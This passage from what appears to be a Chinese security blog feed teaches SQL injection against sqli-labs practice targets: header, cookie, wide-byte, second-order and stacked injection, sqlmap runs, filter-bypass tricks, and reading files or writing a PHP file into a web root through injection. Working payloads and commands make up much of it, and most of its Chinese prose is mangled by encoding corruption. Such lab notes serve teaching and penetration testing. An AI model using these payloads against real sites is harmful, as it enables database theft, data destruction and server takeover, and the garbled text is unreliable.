href="#HTTPå¤´ä¸­çš„SQLæ³¨å…¥" class="headerlink" title="HTTPå¤´ä¸­çš„SQLæ³¨å…¥"></a>HTTPå¤´ä¸­çš„SQLæ³¨å…¥</h1><p>ç”¨æˆ·æäº¤çš„å‚æ•°ä¼šè¢«ä»£ç ä¸­çš„æŸäº›æªæ–½è¿›è¡Œè¿‡æ»¤ï¼Œä½†å¯¹äºHTTPå¤´ä¸­æäº¤çš„å†…å®¹å¾ˆæœ‰å¯èƒ½å°±æ²¡æœ‰è¿›è¡Œè¿‡æ»¤ï¼Œå¦‚HTTPå¤´ä¸­User-Agentã€Refererã€Cookiesç­‰ã€‚</p><p><strong>1.HTTP User-Agent æ³¨å…¥</strong></p><p>åˆ¤æ–­æ³¨å…¥ç‚¹</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201206223156670.png" alt="image-20201206223156670"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39; and extractvalue(1,concat(0x7e,(payload),0x7e)) or &#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201206222552051.png" alt="image-20201206222552051"></p><p><strong>2.HTTP Referer æ³¨å…¥</strong></p><p>æ³¨å…¥ç‚¹åœ¨Refererä½ç½®</p><p><strong>3.Cookieæ³¨å…¥</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: uname&#x3D;admin&#39; and updatexml(1,concat(0x7e,(select database()),0x7e),1)#</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201207155137874.png" alt="image-20201207155137874"></p><p><strong>Sqlmapæµ‹è¯•</strong></p><p>åœ¨æ³¨å…¥ç‚¹ä½ç½®å¤„æ·»åŠ *</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201207160206033.png" alt="image-20201207160206033"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r target.txt --level 3 --batch</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Parameter: Cookie #1* ((custom) HEADER)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: AND boolean-based blind - WHERE or HAVING clause</span><br><span class="line">    Payload: uname&#x3D;admin&#39; AND 6901&#x3D;6901-- FpnT</span><br><span class="line"></span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;&#x3D; 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)</span><br><span class="line">    Payload: uname&#x3D;admin&#39; AND GTID_SUBSET(CONCAT(0x71627a7071,(SELECT (ELT(9508&#x3D;9508,1))),0x71766a7871),9508)-- kWcz</span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;&#x3D; 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: uname&#x3D;admin&#39; AND (SELECT 6663 FROM (SELECT(SLEEP(5)))sHMZ)-- iCIs</span><br><span class="line"></span><br><span class="line">    Type: UNION query</span><br><span class="line">    Title: Generic UNION query (NULL) - 4 columns</span><br><span class="line">    Payload: uname&#x3D;-8722&#39; UNION ALL SELECT NULL,NULL,CONCAT(0x71627a7071,0x4f414141466c504c686648564856454869665a68614a4b564d6c4775556f6d6d79464e446f6f7078,0x71766a7871)-- -</span><br></pre></td></tr></table></figure><h1 id="å®½å­—èŠ‚æ³¨å…¥"><a href="#å®½å­—èŠ‚æ³¨å…¥" class="headerlink" title="å®½å­—èŠ‚æ³¨å…¥"></a>å®½å­—èŠ‚æ³¨å…¥</h1><p>åŸç†ï¼š</p><p>å¤§å®¶éƒ½çŸ¥é“%dfâ€™ è¢«PHPè½¬ä¹‰ï¼ˆå¼€å¯GPCã€ç”¨addslasheså‡½æ•°ï¼Œæˆ–è€…icovç­‰ï¼‰ï¼Œå•å¼•å·è¢«åŠ ä¸Šåæ–œæ \ï¼Œå˜æˆäº† %df\â€™ï¼Œå…¶ä¸­\çš„åå…­è¿›åˆ¶æ˜¯ %5C ï¼Œé‚£ä¹ˆç°åœ¨ <code>%df\â€™</code> =<code>%df%5c%27</code>ï¼Œå¦‚æœç¨‹åºçš„é»˜è®¤å­—ç¬¦é›†æ˜¯GBKç­‰å®½å­—èŠ‚å­—ç¬¦é›†ï¼Œåˆ™MySQLç”¨GBKçš„ç¼–ç æ—¶ï¼Œä¼šè®¤ä¸º <code>%df%5c</code> æ˜¯ä¸€ä¸ªå®½å­—ç¬¦ï¼Œä¹Ÿå°±æ˜¯<code>ç¸—</code>ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼š%df\â€™ = %df%5c%27=ç¸—â€™ï¼Œæœ‰äº†å•å¼•å·å°±å¥½æ³¨å…¥äº†ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201213151446003.png" alt="image-20201213151446003"></p><p>ç¤ºä¾‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqlilabs&#x2F;Less-33&#x2F;index.php?id&#x3D;%df&#39; union select 1,group_concat(username,0x7e,password),3 from users--+</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201210204415465.png" alt="image-20201210204415465"></p><h1 id="äºŒæ¬¡æ³¨å…¥"><a href="#äºŒæ¬¡æ³¨å…¥" class="headerlink" title="äºŒæ¬¡æ³¨å…¥"></a>äºŒæ¬¡æ³¨å…¥</h1><p>åŸç†ï¼š</p><p>äºŒæ¬¡æ³¨å…¥å¯ä»¥ç†è§£ä¸ºï¼Œæ”»å‡»è€…æ„é€ çš„æ¶æ„æ•°æ®å­˜å‚¨åœ¨æ•°æ®åº“åï¼Œæ¶æ„æ•°æ®è¢«è¯»å–å¹¶è¿›å…¥åˆ°SQLæŸ¥è¯¢è¯­å¥æ‰€å¯¼è‡´çš„æ³¨å…¥ã€‚é˜²å¾¡è€…å¯èƒ½åœ¨ç”¨æˆ·è¾“å…¥æ¶æ„æ•°æ®æ—¶å¯¹å…¶ä¸­çš„ç‰¹æ®Šå­—ç¬¦è¿›è¡Œäº†è½¬ä¹‰å¤„ç†ï¼Œä½†åœ¨æ¶æ„æ•°æ®æ’å…¥åˆ°æ•°æ®åº“æ—¶è¢«å¤„ç†çš„æ•°æ®åˆè¢«è¿˜åŸå¹¶å­˜å‚¨åœ¨æ•°æ®åº“ä¸­ï¼Œå½“Webç¨‹åºè°ƒç”¨å­˜å‚¨åœ¨æ•°æ®åº“ä¸­çš„æ¶æ„æ•°æ®å¹¶æ‰§è¡ŒSQLæŸ¥è¯¢æ—¶ï¼Œå°±å‘ç”Ÿäº†SQLäºŒæ¬¡æ³¨å…¥ã€‚</p><p>ç¤ºä¾‹ï¼š</p><p>åœ¨sqlilabsï¼ŒLess-24ä¸­æ³¨å†Œç”¨æˆ·åä¸ºadminâ€™#å¯†ç ä¸º123çš„è´¦å·</p><p>ç™»å½•ç”¨æˆ·å admiâ€™# å¹¶ä¿®æ”¹å¯†ç ä¸º123456ï¼Œç»“æœæ˜¯ç”¨æˆ·åä¸ºadminçš„å¯†ç è¢«ä¿®æ”¹äº†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$sql &#x3D; &quot;UPDATE users SET PASSWORD&#x3D;&#39;$pass&#39; where username&#x3D;&#39;$username&#39; and password&#x3D;&#39;$curr_pass&#39; &quot;;</span><br><span class="line">è¿™æ˜¯ä¸Šé¢çš„æ•°æ®åº“æ›´æ–°è¯­å¥ï¼Œåœ¨ç”¨æˆ·åä¸º &quot;admin&#39;#&quot; æ—¶æ‰§è¡Œçš„å®é™…æ˜¯ï¼š</span><br><span class="line">$sql &#x3D; &quot;UPDATE users SET PASSWORD&#x3D;&#39;$pass&#39; where username&#x3D;&#39;admin&#39;#&#39; and password&#x3D;&#39;$curr_pass&#39; &quot;;</span><br></pre></td></tr></table></figure><h1 id="å †å æ³¨å…¥"><a href="#å †å æ³¨å…¥" class="headerlink" title="å †å æ³¨å…¥"></a>å †å æ³¨å…¥</h1><p>åŸç†ï¼š</p><p>åœ¨SQLä¸­ï¼Œåˆ†å·ï¼ˆ;ï¼‰æ˜¯ç”¨æ¥è¡¨ç¤ºä¸€æ¡sqlè¯­å¥çš„ç»“æŸã€‚è¯•æƒ³ä¸€ä¸‹æˆ‘ä»¬åœ¨ ; ç»“æŸä¸€ä¸ªsqlè¯­å¥åç»§ç»­æ„é€ ä¸‹ä¸€æ¡è¯­å¥ï¼Œä¼šä¸ä¼šä¸€èµ·æ‰§è¡Œï¼Ÿå› æ­¤è¿™ä¸ªæƒ³æ³•ä¹Ÿå°±é€ å°±äº†å †å æ³¨å…¥ã€‚è€Œunion injectionï¼ˆè”åˆæ³¨å…¥ï¼‰ä¹Ÿæ˜¯å°†ä¸¤æ¡è¯­å¥åˆå¹¶åœ¨ä¸€èµ·ï¼Œä¸¤è€…ä¹‹é—´æœ‰ä»€ä¹ˆåŒºåˆ«ä¹ˆï¼ŸåŒºåˆ«å°±åœ¨äºunion æˆ–è€…union allæ‰§è¡Œçš„è¯­å¥ç±»å‹æ˜¯æœ‰é™çš„ï¼Œå¯ä»¥ç”¨æ¥æ‰§è¡ŒæŸ¥è¯¢è¯­å¥ï¼Œè€Œå †å æ³¨å…¥å¯ä»¥æ‰§è¡Œçš„æ˜¯ä»»æ„çš„è¯­å¥ã€‚ä¾‹å¦‚ä»¥ä¸‹è¿™ä¸ªä¾‹å­ã€‚ç”¨æˆ·è¾“å…¥ï¼š1; DELETE FROM productsæœåŠ¡å™¨ç«¯ç”Ÿæˆçš„sqlè¯­å¥ä¸ºï¼šï¼ˆå› æœªå¯¹è¾“å…¥çš„å‚æ•°è¿›è¡Œè¿‡æ»¤ï¼‰Select * from products where productid=1;DELETE FROM productså½“æ‰§è¡ŒæŸ¥è¯¢åï¼Œç¬¬ä¸€æ¡æ˜¾ç¤ºæŸ¥è¯¢ä¿¡æ¯ï¼Œç¬¬äºŒæ¡åˆ™å°†æ•´ä¸ªè¡¨è¿›è¡Œåˆ é™¤</p><p>å±€é™æ€§ï¼š</p><p>å †å æ³¨å…¥çš„å±€é™æ€§åœ¨äºå¹¶ä¸æ˜¯æ¯ä¸€ä¸ªç¯å¢ƒä¸‹éƒ½å¯ä»¥æ‰§è¡Œï¼Œ å¯èƒ½å—åˆ° API æˆ–è€…æ•°æ®åº“å¼•æ“ä¸æ”¯æŒçš„é™åˆ¶ï¼Œåœ¨æˆ‘ä»¬çš„ web ç³»ç»Ÿä¸­ï¼Œ å› ä¸ºä»£ç é€šå¸¸åªè¿”å›ä¸€ä¸ªæŸ¥è¯¢ç»“æœï¼Œ å› æ­¤ï¼Œ å †å æ³¨å…¥ç¬¬äºŒä¸ªè¯­å¥äº§ç”Ÿé”™è¯¯æˆ–è€…ç»“æœåªèƒ½è¢«å¿½ç•¥ï¼Œ æˆ‘ä»¬åœ¨å‰ç«¯ç•Œé¢æ˜¯æ— æ³•çœ‹åˆ°è¿”å›ç»“æœçš„ã€‚å› æ­¤ï¼Œ åœ¨è¯»å–æ•°æ®æ—¶ï¼Œå»ºè®®ä½¿ç”¨unionï¼ˆè”åˆï¼‰ æ³¨å…¥ã€‚ åŒæ—¶åœ¨ä½¿ç”¨å †å æ³¨å…¥ä¹‹å‰ï¼Œæˆ‘ä»¬ä¹Ÿæ˜¯éœ€è¦çŸ¥é“ä¸€äº›æ•°æ®åº“ç›¸å…³ä¿¡æ¯çš„ï¼Œ ä¾‹å¦‚è¡¨<br>åï¼Œ åˆ—åç­‰ä¿¡æ¯</p><p>PSï¼šoracle ä¸èƒ½ä½¿ç”¨å †å æ³¨å…¥ï¼Œ å½“æœ‰ä¸¤æ¡è¯­å¥åœ¨åŒä¸€è¡Œæ—¶ï¼Œ ç›´æ¥æŠ¥é”™ã€‚ æ— æ•ˆå­—ç¬¦</p><p>payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-38&#x2F;index.php ?id&#x3D;1%27;insert into users(id,username,password) values (&#39;39&#39;,&#39;less39&#39;,&#39;hello&#39;)--+</span><br></pre></td></tr></table></figure><h1 id="Mysqlæ³¨å…¥è¯»å†™æ–‡ä»¶"><a href="#Mysqlæ³¨å…¥è¯»å†™æ–‡ä»¶" class="headerlink" title="Mysqlæ³¨å…¥è¯»å†™æ–‡ä»¶"></a>Mysqlæ³¨å…¥è¯»å†™æ–‡ä»¶</h1><p>1.è¯»æ–‡ä»¶ï¼ˆ<a href="http://www.cnblogs.com/lcamry/p/5729087.html">MySQLæ³¨å…¥load_fileå¸¸ç”¨è·¯å¾„</a>ï¼‰</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqlilabs&#x2F;Less-1&#x2F;index.php&#x2F;?id&#x3D;-1&#39; union select 1,2,load_file(&#39;D:\\1.txt&#39;)--+</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201130215923264.png" alt="image-20201130215923264"></p><p>2.å†™æ–‡ä»¶ï¼ˆå†™webshellåˆ°ç½‘ç«™ç›®å½•ï¼‰</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqlilabs&#x2F;Less-7&#x2F;index.php&#x2F;?id&#x3D;-1&#39;)) union select 1,&#39;&lt;?php phpinfo(); ?&gt;&#39;,3 into outfile &#39;E:\\web\\apache\\htdocs\\1.php&#39;--+</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201130222727784.png" alt="image-20201130222727784"></p><p><strong>åˆ©ç”¨Sqlmapè¯»å†™æ–‡ä»¶</strong></p><p>â€“file-read â€œè·¯å¾„â€</p><p>â€“file-write â€œè¦å†™å…¥çš„å†…å®¹æˆ–æ‰€åœ¨æ–‡ä»¶è·¯å¾„â€ â€“file-dest â€œè¦å†™å…¥çš„è·¯å¾„â€</p><p>1.è¯»æ–‡ä»¶</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;sqlilabs&#x2F;Less-7&#x2F;index.php&#x2F;?id&#x3D;1&quot; --file-read &quot;D:\\1.txt&quot;</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201130224238087.png" alt="image-20201130224238087"></p><p>2.å†™æ–‡ä»¶</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;sqlilabs&#x2F;Less-7&#x2F;index.php&#x2F;?id&#x3D;1&quot; --file-write &quot;E:\\1.txt&quot; --file-dest &quot;E:\\2.txt&quot;</span><br></pre></td></tr></table></figure><h1 id="SQLæ³¨å…¥ç»•è¿‡æ‰‹æ®µ"><a href="#SQLæ³¨å…¥ç»•è¿‡æ‰‹æ®µ" class="headerlink" title="SQLæ³¨å…¥ç»•è¿‡æ‰‹æ®µ"></a>SQLæ³¨å…¥ç»•è¿‡æ‰‹æ®µ</h1><p><strong>1.å¤§å°å†™ç»•è¿‡</strong></p><p>ä¾‹å¦‚ï¼šå¦‚æœè¿‡æ»¤äº†orderï¼Œå¯ä»¥ä½¿ç”¨OrdERæ¥è¿›è¡Œç»•è¿‡</p><p><strong>2.åŒå†™ç»•è¿‡</strong></p><p>ä¾‹å¦‚ï¼šå¦‚æœè¿‡æ»¤äº†unionï¼Œå‘ç°unionæ— è®ºå¤§å°å†™éƒ½ä¼šè¢«æ›¿æ¢ä¸ºç©ºï¼Œå¯ä»¥ä½¿ç”¨UniunionOn</p><p><strong>3.ç¼–ç ç»•è¿‡</strong></p><p>å¯ä»¥åˆ©ç”¨URLç¼–ç ï¼Œç»•è¿‡è¿‡æ»¤æœºåˆ¶</p><p>å¦‚ï¼Œunion%250cselect </p><p><strong>4.å†…è”æ³¨é‡Šç»•è¿‡</strong></p><p>å†…è”æ³¨é‡Šé‡Œçš„å†…å®¹ä¼šè¢«å½“æˆSQLè¯­å¥æ‰§è¡Œï¼Œä¾‹å¦‚/*!select */</p><p><strong>5.ç»•è¿‡å»é™¤æ³¨é‡Šç¬¦çš„SQLæ³¨å…¥</strong></p><p>â€“+ï¼Œâ€“ ï¼Œ# ï¼Œç­‰æ³¨é‡Šç¬¦è¢«è¿‡æ»¤å¤±æ•ˆï¼Œè€ƒè™‘å…¶ä»–æ–¹å¼ï¼Œå¦‚ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.77.1&#x2F;sqlilabs&#x2F;Less-23&#x2F;index.php&#x2F;?id&#x3D;-1&#39; union select 1,2,&#39;3</span><br><span class="line">http:&#x2F;&#x2F;192.168.77.1&#x2F;sqlilabs&#x2F;Less-23&#x2F;index.php&#x2F;?id&#x3D;1&#39; or (extractvalue(1,concat(0x7e,(payload)))) or &#39;</span><br></pre></td></tr></table></figure><p><strong>6.ç»•è¿‡è¿‡æ»¤andå’Œorçš„SQLæ³¨å…¥</strong></p><p>å¤§å°å†™å˜å½¢ï¼ŒOrï¼ŒoRï¼ŒAndï¼ŒaNDç­‰</p><p>æ·»åŠ æ³¨é‡Šï¼Œa/**/nd</p><p>åŒå†™ç»•è¿‡ï¼Œoorr</p><p>åˆ©ç”¨ç¬¦å·æ›¿ä»£ï¼Œandâ€“&amp;&amp;,orâ€“||</p><p><strong>7.ç»•è¿‡ç©ºæ ¼è¿‡æ»¤</strong></p><p>å¯ä½¿ç”¨ä»¥ä¸‹ä»£æ›¿ç©ºæ ¼</p><p>%09  TAB é”®ï¼ˆæ°´å¹³ï¼‰</p><p>%0b  TAB é”®ï¼ˆå‚ç›´ï¼‰</p><p>%0a  æ–°å»ºä¸€è¡Œ</p><p>%0c  æ–°çš„ä¸€é¡µ</p><p>%0d  return åŠŸèƒ½</p><p>%a0  ç©ºæ ¼</p><p>/* xxx*/  ä»£æ›¿ç©ºæ ¼(åˆ©ç”¨fuzzå¾—å‡ºxxx)</p><p>æˆ–è¯­å¥é—´ç”¨æ‹¬å·ï¼Œå¦‚ select(1)from(admin)where(length(passwd))=32</p><h1 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h1><p>[1] <a href="https://blog.csdn.net/DarkHQ/article/details/79274376">mysqlç›²æ³¨ï¼ˆåŸºäºæ—¶é—´ï¼‰</a></p><p>[2] <a href="https://www.cnblogs.com/csyxf/p/10241456.html">MysqlæŠ¥é”™å‹æ³¨å…¥æ€»ç»“</a></p><p>[3] <a href="https://blog.csdn.net/weixin_45146120/article/details/100186266?utm_medium=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromBaidu-1.control&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromBaidu-1.control">MYSQL POSTå‹æ³¨å…¥è¯¦è§£</a></p><p>[4] <a href="https://www.jianshu.com/p/3fe7904683ac">SQLæ³¨å…¥é˜²å¾¡ç»•è¿‡â€”â€”äºŒæ¬¡æ³¨å…¥</a></p><p>[5] <a href="https://blog.csdn.net/helloc0de/article/details/76180190">SQLæ³¨å…¥æ•™ç¨‹â€”â€”ï¼ˆå››ï¼‰å®½å­—èŠ‚æ³¨å…¥</a></p><p>[6] <a href="https://blog.csdn.net/qq_26406447/article/details/90643951">SQL Injection8(å †å æ³¨å…¥)â€”â€”å¼ºç½‘æ¯2019éšä¾¿æ³¨</a></p><p>[7] <a href="https://blog.csdn.net/weixin_44032232/article/details/109262724">ã€æ¸—é€æµ‹è¯•ã€‘DNSLogæ³¨å…¥</a></p>]]></content>
      
      
      <categories>
          
          <category> Webå®‰å…¨ </category>
          
          <category> SQL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Webå®‰å…¨ </tag>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQLé»˜è®¤åº“åŠè¯»å†™æ–‡ä»¶</title>
      <link href="posts/36028.html"/>
      <url>posts/36028.html</url>
      
        <content type="html"><![CDATA[<h1 id="MySQLé»˜è®¤åº“"><a href="#MySQLé»˜è®¤åº“" class="headerlink" title="MySQLé»˜è®¤åº“"></a>MySQLé»˜è®¤åº“</h1><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/ReAX6wu7mGhDbzE.png" alt="image-20201101161119257"></p><h2 id="information-schema"><a href="#information-schema" class="headerlink" title="information_schema"></a>information_schema</h2><p>åœ¨MySQLä¸­ï¼ŒæŠŠ information_schema çœ‹ä½œæ˜¯ä¸€ä¸ªæ•°æ®åº“ï¼Œç¡®åˆ‡è¯´æ˜¯ä¿¡æ¯æ•°æ®åº“ã€‚å…¶ä¸­ä¿å­˜ç€å…³äºMySQLæœåŠ¡å™¨æ‰€ç»´æŠ¤çš„æ‰€æœ‰å…¶ä»–æ•°æ®åº“çš„ä¿¡æ¯ã€‚å¦‚æ•°æ®åº“åï¼Œæ•°æ®åº“çš„è¡¨ï¼Œå­—æ®µç±»å‹ä¸è®¿é—®æƒ é™ç­‰ã€‚</p><p>æŸ¥è¯¢æ•°æ®åº“ã€è¡¨åã€å­—æ®µç­‰ä¿¡æ¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># çˆ†æ‰€æœ‰ç”¨æˆ·</span><br><span class="line">select group_concat(user) from mysql.user;</span><br><span class="line"> </span><br><span class="line"># çˆ†æ‰€æœ‰æ•°æ®åº“</span><br><span class="line">select group_concat(SCHEMA_NAME) from information_schema.schemata;</span><br><span class="line"> </span><br><span class="line"># çˆ†å½“å‰æ•°æ®åº“çš„è¡¨å</span><br><span class="line">select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database();</span><br><span class="line"> </span><br><span class="line"># è¡¨ä¸­æœ‰ä¸»ç çº¦æŸï¼Œéç©ºçº¦æŸç­‰å®Œæ•´æ€§çº¦æŸæ¡ä»¶çš„æƒ…å†µä¸‹ çˆ†è¡¨å</span><br><span class="line">select group_concat(table_name) from information_schema.table_constraints where table_schema&#x3D;database();</span><br><span class="line"> </span><br><span class="line"># çˆ†å­—æ®µå(è¡¨åæ˜¯ usersï¼ŒåŠ å¼•å·æˆ–åå…­è¿›åˆ¶ç¼–ç )</span><br><span class="line">select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39;;</span><br><span class="line">select group_concat(column_name) from information_schema.columns where table_name&#x3D;0x7573657273;</span><br><span class="line"> </span><br><span class="line"># çˆ†å­—æ®µå†…å®¹</span><br><span class="line">select first_name,password from usersï¼›</span><br></pre></td></tr></table></figure><h2 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h2><p>è¿™ä¸ªæ˜¯mysqlçš„æ ¸å¿ƒæ•°æ®åº“ï¼Œç±»ä¼¼äºsql serverä¸­çš„masterè¡¨ï¼Œä¸»è¦è´Ÿè´£å­˜å‚¨æ•°æ®åº“çš„ç”¨æˆ·ã€æƒé™è®¾ç½®ã€å…³é”®å­—ç­‰mysqlè‡ªå·±éœ€è¦ä½¿ç”¨çš„æ§åˆ¶å’Œç®¡ç†ä¿¡æ¯ã€‚ä¸å¯ä»¥åˆ é™¤ï¼Œå¦‚æœå¯¹mysqlä¸æ˜¯å¾ˆäº†è§£ï¼Œä¹Ÿä¸è¦è½»æ˜“ä¿®æ”¹è¿™ä¸ªæ•°æ®åº“é‡Œé¢çš„è¡¨ä¿¡æ¯ã€‚</p><h2 id="performance-schema"><a href="#performance-schema" class="headerlink" title="performance_schema"></a>performance_schema</h2><p>MySQL 5.5å¼€å§‹æ–°å¢ä¸€ä¸ªæ•°æ®åº“ï¼šPERFORMANCE_SCHEMAï¼Œä¸»è¦ç”¨äºæ”¶é›†æ•°æ®åº“æœåŠ¡å™¨æ€§èƒ½å‚æ•°ã€‚å¹¶ä¸”åº“é‡Œè¡¨çš„å­˜å‚¨å¼•æ“PERFORMANCE_SCHEMAï¼Œè€Œç”¨æˆ·æ˜¯ä¸èƒ½åˆ›å»ºå­˜å‚¨å¼•æ“ä¸ºPERFORMANCE_SCHEMAçš„è¡¨ã€‚</p><h2 id="sys"><a href="#sys" class="headerlink" title="sys"></a>sys</h2><p>Sysåº“æ‰€æœ‰çš„æ•°æ®æºæ¥è‡ªï¼šperformance_schemaã€‚ç›®æ ‡æ˜¯æŠŠperformance_schemaçš„æŠŠå¤æ‚åº¦é™ä½ï¼Œè®©DBAèƒ½æ›´å¥½çš„é˜…è¯»è¿™ä¸ªåº“é‡Œçš„å†…å®¹ï¼Œè®©DBAæ›´å¿«çš„äº†è§£DBçš„è¿è¡Œæƒ…å†µã€‚ï¼ˆ<a href="https://blog.csdn.net/jayewu/article/details/80183274">è¯¦æƒ…</a>ï¼‰</p><h1 id="åˆ©ç”¨æ•°æ®åº“çš„åŠŸèƒ½è¯»å†™æ–‡ä»¶"><a href="#åˆ©ç”¨æ•°æ®åº“çš„åŠŸèƒ½è¯»å†™æ–‡ä»¶" class="headerlink" title="åˆ©ç”¨æ•°æ®åº“çš„åŠŸèƒ½è¯»å†™æ–‡ä»¶"></a>åˆ©ç”¨æ•°æ®åº“çš„åŠŸèƒ½è¯»å†™æ–‡ä»¶</h1><h2 id="æ¡ä»¶"><a href="#æ¡ä»¶" class="headerlink" title="æ¡ä»¶"></a>æ¡ä»¶</h2><p>ï¼ˆ1ï¼‰æ•°æ®åº“å…è®¸å¯¼å…¥å¯¼å‡ºï¼ˆsecure_file_privä¸ä¸ºNULLï¼‰</p><p>æŸ¥çœ‹æ•°æ®åº“æ˜¯å¦å¼€å¯å¯¼å…¥å¯¼å‡ºï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show global variables like &#39;secure_file_priv&#39;;</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/cHQ8D7LdrBCN3Ea.png" alt="image-20201113225818984"></p><p>   è¯´æ˜ï¼šsecure_file_privæ˜¯ç”¨æ¥é™åˆ¶load_fileã€load dataå’Œselect  outfileæ“ä½œå“ªä¸ªæŒ‡å®šç›®å½•ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/yRk6KT1us85Jfhc.png" alt="img"></p><p>æˆ‘è¿™é‡Œé»˜è®¤æ˜¯ <strong>/var/lib/mysql-files</strong> ,å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼ä¿®æ”¹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi &#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf</span><br></pre></td></tr></table></figure><p>åœ¨æœ€åæ·»åŠ </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secure file priv&#x3D;&#39;&#39;</span><br></pre></td></tr></table></figure><p>é‡å¯mysqlæœåŠ¡ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service mysql restart</span><br></pre></td></tr></table></figure><p>ï¼ˆ2ï¼‰å½“å‰ç”¨æˆ·çš„æ–‡ä»¶æ“ä½œæƒé™ï¼ˆFile_privï¼šYï¼‰</p><p>â€‹     æŸ¥çœ‹å½“å‰ç”¨æˆ·æ˜¯å¦å…·æœ‰æ–‡ä»¶è¯»å†™æƒé™ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select File_priv from mysql.user where user&#x3D;&#39;root&#39; and host &#x3D;&#39;localhost&#39;;</span><br></pre></td></tr></table></figure><p><img 